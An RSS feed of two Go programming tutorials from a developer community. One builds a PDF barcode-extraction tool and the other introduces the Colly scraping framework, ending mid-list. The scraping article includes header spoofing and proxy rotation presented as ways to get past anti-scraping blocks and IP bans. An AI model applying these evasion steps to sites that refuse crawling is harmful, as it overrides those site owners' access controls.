<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Go 语言实战 从 PDF 批量提取条码的自动化工具开发全流程解析]]></title>    <link>https://juejin.cn/post/7576086557717086259</link>    <guid>https://juejin.cn/post/7576086557717086259</guid>    <pubDate>2025-11-25T00:14:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576086557717086259" data-draft-id="7576141849430523931" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go 语言实战 从 PDF 批量提取条码的自动化工具开发全流程解析"/> <meta itemprop="keywords" content="后端,Go,Trae"/> <meta itemprop="datePublished" content="2025-11-25T00:14:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go 语言实战 从 PDF 批量提取条码的自动化工具开发全流程解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:14:49.000Z" title="Tue Nov 25 2025 00:14:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在实际的业务场景中，我们常常需要从 PDF 文件中提取条码信息，例如快递面单 批次单 票据 物流标签等。手动逐个查看显然效率极低。为了解决这个痛点，我们可以通过 Go 语言开发一个 <strong>自动扫描目录内所有 PDF 并提取条码（二者均支持二维码与 Code128 条码）</strong> 的实用工具。</p>
</blockquote>
<p>本文将结合一段完整的 Go 代码逐步解析其实现原理，为你构建类似工具提供参考。</p>
<hr/>
<h2 data-id="heading-0"><strong>一 整体功能设计</strong></h2>
<p>这个程序实现了以下功能</p>
<p>1 自动扫描当前目录及所有子目录中的 PDF 文件
2 利用 go fitz 将 PDF 渲染为图片
3 使用 gozxing 库识别条码 支持</p>
<ul>
<li>Code128 一维条码</li>
<li>QR Code 二维码
4 将识别结果按文件保存到 CSV
5 运行结束后输出条码统计结果</li>
</ul>
<p>输出文件示例</p>
<pre><code class="hljs language-bash" lang="bash">文件名,条码数量,条码内容
./docs/label1.pdf,2,1234567890; https://example.com
</code></pre>
<hr/>
<h2 data-id="heading-1"><strong>二 核心库介绍</strong></h2>
<p>本工具主要用到三个库</p>
<h4 data-id="heading-2"><strong>1 go fitz（PDF 渲染库）</strong></h4>
<p>用于将 PDF 页面转换成 image.Image，以便进一步识别条码。</p>
<h4 data-id="heading-3"><strong>2 gozxing（ZXing Go 语言实现）</strong></h4>
<p>支持各种条码格式，包括 Code128 和 QRCode，是本程序的识别核心。</p>
<h4 data-id="heading-4"><strong>3 encoding/csv</strong></h4>
<p>将识别结果输出为 CSV 文件，方便统计分析。</p>
<hr/>
<h2 data-id="heading-5"><strong>三 条码识别核心 decodeSingle</strong></h2>
<p>下面是条码识别的关键函数，它接收一张图片并尝试读取两类条码。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">decodeSingle</span><span class="hljs-params">(img image.Image)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    bitmap, err := gozxing.NewBinaryBitmapFromImage(img)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }

    <span class="hljs-keyword">var</span> results []<span class="hljs-type">string</span>

    <span class="hljs-comment">// Code128</span>
    reader := oned.NewCode128Reader()
    res, err := reader.Decode(bitmap, <span class="hljs-literal">nil</span>)
    <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
        results = <span class="hljs-built_in">append</span>(results, res.String())
    }

    <span class="hljs-comment">// QRCode</span>
    qrReader := qrcode.NewQRCodeReader()
    resQR, err := qrReader.Decode(bitmap, <span class="hljs-literal">nil</span>)
    <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
        results = <span class="hljs-built_in">append</span>(results, resQR.String())
    }

    <span class="hljs-keyword">return</span> results, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>设计亮点</p>
<ul>
<li>即使某一种条码识别失败，也不会影响其他类型条码的解析</li>
<li>返回一个字符串数组，可兼容多个条码同时存在</li>
</ul>
<hr/>
<h2 data-id="heading-6"><strong>四 PDF 批量处理 extractFromPDF</strong></h2>
<p>Go fitz 会将 PDF 每一页转成图片，然后逐页识别。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; doc.NumPage(); i++ {
    img, err := doc.Image(i)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">continue</span>
    }
    codes, _ := decodeSingle(img)
    allCodes = <span class="hljs-built_in">append</span>(allCodes, codes...)
}
</code></pre>
<p>设计亮点</p>
<ul>
<li>支持多页 PDF</li>
<li>遇到无法渲染的页面会跳过而不影响整体运行</li>
</ul>
<hr/>
<h2 data-id="heading-7"><strong>五 扫描目录下所有 PDF</strong></h2>
<p>程序通过 WalkDir 遍历当前目录及所有子目录，非常适合批量处理业务场景。</p>
<pre><code class="hljs language-go" lang="go">filepath.WalkDir(<span class="hljs-string">"."</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(path <span class="hljs-type">string</span>, d os.DirEntry, err <span class="hljs-type">error</span>)</span></span> <span class="hljs-type">error</span> {
    <span class="hljs-keyword">if</span> !d.IsDir() &amp;&amp; strings.HasSuffix(strings.ToLower(d.Name()), <span class="hljs-string">".pdf"</span>) {
        pdfFiles = <span class="hljs-built_in">append</span>(pdfFiles, path)
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
})
</code></pre>
<hr/>
<h2 data-id="heading-8"><strong>六 结果写入 CSV</strong></h2>
<p>所有识别出的条码最终写入 CSV：</p>
<pre><code class="hljs language-go" lang="go">writer.Write([]<span class="hljs-type">string</span>{
    pdf,
    fmt.Sprintf(<span class="hljs-string">"%d"</span>, <span class="hljs-built_in">len</span>(codes)),
    strings.Join(codes, <span class="hljs-string">"; "</span>),
})
</code></pre>
<p>优势</p>
<ul>
<li>Excel 可直接打开</li>
<li>可继续二次加工，例如进行去重、统计、匹配等需求</li>
</ul>
<hr/>
<h2 data-id="heading-9"><strong>七 完整流程示例</strong></h2>
<p>工具的标准运行流程如下</p>
<p>1 放置 PDF 文件于任意子目录
2 运行程序
3 自动发现所有 PDF
4 自动解析每一页条码
5 结果写入 barcode_result.csv
6 通过控制台展示解析过程</p>
<p>最终输出：</p>
<pre><code class="hljs">完成 → barcode_result.csv
</code></pre>
<hr/>
<h2 data-id="heading-10"><strong>八 常见问题与优化思路</strong></h2>
<h4 data-id="heading-11">1 PDF 页面图片过大导致识别慢</h4>
<p>可添加缩放处理提升识别速度</p>
<h4 data-id="heading-12">2 某些条码识别率不高</h4>
<ul>
<li>增加亮度增强滤波</li>
<li>多角度旋转尝试识别</li>
</ul>
<h4 data-id="heading-13">3 部分 PDF 含多张图片</h4>
<p>可将 fitz.Image 转换过程进一步优化，提取所有图层图片</p>
<h4 data-id="heading-14">4 支持更多条码格式</h4>
<p>gozxing 还支持 Code39、EAN 等，可直接扩展</p>
<hr/>
<h2 data-id="heading-15"><strong>九 总结</strong></h2>
<p>本文介绍了一个完整的 Go 工具，实现了目录扫描 PDF 图片提取条码识别结果导出 CSV 的全自动流程。通过 go fitz 和 gozxing，我们可以快速构建企业级批量 PDF 条码识别工具。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go 语言爬虫实战：基于 Colly 的高性能采集框架指南]]></title>    <link>https://juejin.cn/post/7576105442214314034</link>    <guid>https://juejin.cn/post/7576105442214314034</guid>    <pubDate>2025-11-25T00:15:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576105442214314034" data-draft-id="7576124206398406666" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go 语言爬虫实战：基于 Colly 的高性能采集框架指南"/> <meta itemprop="keywords" content="后端,Go,Trae"/> <meta itemprop="datePublished" content="2025-11-25T00:15:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go 语言爬虫实战：基于 Colly 的高性能采集框架指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:15:24.000Z" title="Tue Nov 25 2025 00:15:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Python 生态中，Scrapy 是大家熟知的爬虫框架；而在 Go 语言世界里，<strong>Colly</strong> 则是同级别的轻量级、高性能、易扩展的采集利器。
凭借 Go 的并发优势，Colly 能够在极低资源占用下实现高并发抓取，是构建数据采集、监控、舆情系统的理想选择。</p>
<p>本文将带你快速掌握 Colly 的核心能力，从安装、基础用法到反爬突破与案例实战，帮助你快速上手 Go 爬虫。</p>
<hr/>
<h2 data-id="heading-0">一 Colly 是什么？</h2>
<p>Colly 是 Go 中最流行的爬虫框架之一，目标是提供
<strong>快速 可靠 可扩展 的网络爬虫解决方案</strong></p>
<p>它具有以下特点：</p>
<ul>
<li>API 简洁清晰，上手难度低</li>
<li>内置并发队列，支持高并发爬取</li>
<li>自动管理 Cookie、Referer、User-Agent</li>
<li>支持 DOM 选择器 CSS Selector</li>
<li>支持深度控制、域名白名单、请求限制</li>
<li>支持回调函数式编程，非常灵活</li>
<li>可扩展中间件、代理、去重规则</li>
</ul>
<p>这使得 Colly 成为构建生产级爬虫的强大工具。</p>
<hr/>
<h2 data-id="heading-1">二 安装 Colly</h2>
<p>执行：</p>
<pre><code class="hljs language-bash" lang="bash">go get -u github.com/gocolly/colly/v2
</code></pre>
<p>导入：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gocolly/colly/v2"</span>
</code></pre>
<p>你就可以开始写爬虫了。</p>
<hr/>
<h2 data-id="heading-2">三 编写你的第一个 Colly 爬虫</h2>
<p>下面通过一个示例，抓取新闻网站的标题。</p>
<h3 data-id="heading-3">1 创建采集器</h3>
<pre><code class="hljs language-go" lang="go">c := colly.NewCollector()
</code></pre>
<h3 data-id="heading-4">2 注册回调解析页面内容</h3>
<pre><code class="hljs language-go" lang="go">c.OnHTML(<span class="hljs-string">"h1.title"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> {
    fmt.Println(<span class="hljs-string">"标题:"</span>, e.Text)
})
</code></pre>
<h3 data-id="heading-5">3 处理请求事件</h3>
<pre><code class="hljs language-go" lang="go">c.OnRequest(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(r *colly.Request)</span></span> {
    fmt.Println(<span class="hljs-string">"正在访问:"</span>, r.URL.String())
})
</code></pre>
<h3 data-id="heading-6">4 开始访问网页</h3>
<pre><code class="hljs language-go" lang="go">c.Visit(<span class="hljs-string">"https://news.ycombinator.com/"</span>)
</code></pre>
<p>完整代码：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"github.com/gocolly/colly/v2"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	c := colly.NewCollector()

	c.OnRequest(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(r *colly.Request)</span></span> {
		fmt.Println(<span class="hljs-string">"访问:"</span>, r.URL.String())
	})

	c.OnHTML(<span class="hljs-string">"a.storylink"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> {
		fmt.Println(<span class="hljs-string">"标题:"</span>, e.Text)
		fmt.Println(<span class="hljs-string">"链接:"</span>, e.Attr(<span class="hljs-string">"href"</span>))
	})

	c.Visit(<span class="hljs-string">"https://news.ycombinator.com/"</span>)
}
</code></pre>
<p>运行后即可得到列表页面的标题与链接。</p>
<hr/>
<h2 data-id="heading-7">四 处理多页面采集（自动跟随链接）</h2>
<p>Colly 支持在页面中发现新的 URL 并自动继续爬取：</p>
<pre><code class="hljs language-go" lang="go">c.OnHTML(<span class="hljs-string">"a[href]"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> {
    link := e.Request.AbsoluteURL(e.Attr(<span class="hljs-string">"href"</span>))
    c.Visit(link)
})
</code></pre>
<p>配合访问去重机制，Colly 会自动忽略已访问 URL。</p>
<hr/>
<h2 data-id="heading-8">五 设置请求限制：防止被封 IP</h2>
<p>为了避免频繁访问触发反爬，可以设置速率限制。</p>
<pre><code class="hljs language-go" lang="go">c.Limit(&amp;colly.LimitRule{
	DomainGlob:  <span class="hljs-string">"*"</span>,
	Delay:       <span class="hljs-number">1</span> * time.Second,
	RandomDelay: <span class="hljs-number">500</span> * time.Millisecond,
})
</code></pre>
<p>也可以限制并发：</p>
<pre><code class="hljs language-go" lang="go">c.Limit(&amp;colly.LimitRule{
	DomainGlob:  <span class="hljs-string">"*"</span>,
	Parallelism: <span class="hljs-number">2</span>,
})
</code></pre>
<hr/>
<h2 data-id="heading-9">六 设置 User-Agent、Cookie 与 Header</h2>
<p>反爬网站通常会检查 UA 或 Cookie。</p>
<pre><code class="hljs language-go" lang="go">c.OnRequest(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(r *colly.Request)</span></span> {
	r.Headers.Set(<span class="hljs-string">"User-Agent"</span>, <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0)"</span>)
	r.Headers.Set(<span class="hljs-string">"Referer"</span>, <span class="hljs-string">"https://www.google.com"</span>)
})
</code></pre>
<hr/>
<h2 data-id="heading-10">七 使用代理池突破封禁</h2>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gocolly/colly/v2/proxy"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	c := colly.NewCollector()
	
	rp, _ := proxy.RoundRobinProxySwitcher(
		<span class="hljs-string">"http://127.0.0.1:8080"</span>,
		<span class="hljs-string">"http://127.0.0.1:8081"</span>,
	)
	c.SetProxyFunc(rp)

	c.Visit(<span class="hljs-string">"https://example.com"</span>)
}
</code></pre>
<p>多代理轮换能显著降低封 IP 风险。</p>
<hr/>
<h2 data-id="heading-11">八 深度控制与域名限制</h2>
<p>防止爬虫跑飞：</p>
<pre><code class="hljs language-go" lang="go">c.AllowedDomains = []<span class="hljs-type">string</span>{<span class="hljs-string">"example.com"</span>}
</code></pre>
<p>限制深度：</p>
<pre><code class="hljs language-go" lang="go">c.MaxDepth = <span class="hljs-number">2</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">九 数据存储：CSV、JSON、数据库</h2>
<p>保存到 CSV：</p>
<pre><code class="hljs language-go" lang="go">f, _ := os.Create(<span class="hljs-string">"result.csv"</span>)
w := csv.NewWriter(f)

c.OnHTML(<span class="hljs-string">"h2"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> {
    w.Write([]<span class="hljs-type">string</span>{e.Text})
})
</code></pre>
<p>保存到 MySQL / MongoDB 也只需在回调中插入数据库即可。</p>
<hr/>
<h2 data-id="heading-13">十 实战案例：抓取京东商品信息</h2>
<p>示例：抓取商品名称与价格</p>
<pre><code class="hljs language-go" lang="go">c := colly.NewCollector()

c.OnHTML(<span class="hljs-string">".gl-item"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> {
	title := e.ChildText(<span class="hljs-string">".p-name em"</span>)
	price := e.ChildText(<span class="hljs-string">".p-price i"</span>)
	fmt.Println(title, price)
})

c.Visit(<span class="hljs-string">"https://search.jd.com/Search?keyword=手机"</span>)
</code></pre>
<p>输出：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">小米</span> <span class="hljs-number">14</span> <span class="hljs-number">4599</span>
<span class="hljs-string">iPhone</span> <span class="hljs-number">15</span> <span class="hljs-number">5999</span>
<span class="hljs-string">……</span>
</code></pre>
<p>短短十行代码即可完成一个实用的采集器。</p>
<hr/>
<h2 data-id="heading-14">十一 Colly 适合哪些场景？</h2>
<ul>
<li>商品价格监控</li>
<li>平台舆情与数据采集</li>
<li>文章/新闻抓取</li>
<li>实时监控系统</li>
<li>多站点聚合爬虫</li>
<li>数据分析与可视化后台的数据来源</li>
</ul>
<p>Go 的高并发 + Colly 的简洁 API = 高性能、高可靠的数据采集工具。</p>
<hr/>
<h2 data-id="heading-15">十二 总结</h2>
<p>Colly 是 Go 中最易用、最强大的爬虫框架之一，具备：</p>
<ul>
<li>API 简洁</li>
<li>并发强</li>
<li>扩展性高</li>
<li>稳定可靠</li>
</ul>
<p>本文从基础到高级应用进行了全面讲解，包括：</p>
<ol>
<li>创建采集器与回调</li>
<li>解析页面内容</li>
<li>控制并发与反爬</li>
<li>代理池与 UA 伪装</li>
<li>自动跟随链接</li>
<li>保存数据</li>
<li>实战案例</li>
